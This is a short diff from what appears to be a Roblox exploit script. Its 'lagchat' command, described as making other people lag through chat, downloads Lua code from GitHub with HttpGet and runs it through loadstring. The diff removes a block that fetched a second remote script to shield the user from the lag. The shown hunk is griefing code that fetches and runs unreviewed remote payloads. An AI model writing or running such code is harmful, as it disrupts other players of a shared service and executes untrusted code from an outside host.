@@ -7576,10 +7576,6 @@ AddCommand("lagchat", {}, "makes people lag using chat", {}, function()
 	--<Chat Lag>--
 	--loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/ChatLag.lua"))()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/LighTMolT/wdawdv/main/laggaer"))()
-	
-	--<Anti Lag For Yourself>--
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLag.lua"))()
-
 end)
 
 AddCommand("errorchat", {}, "makes the chat error appear", {}, function()
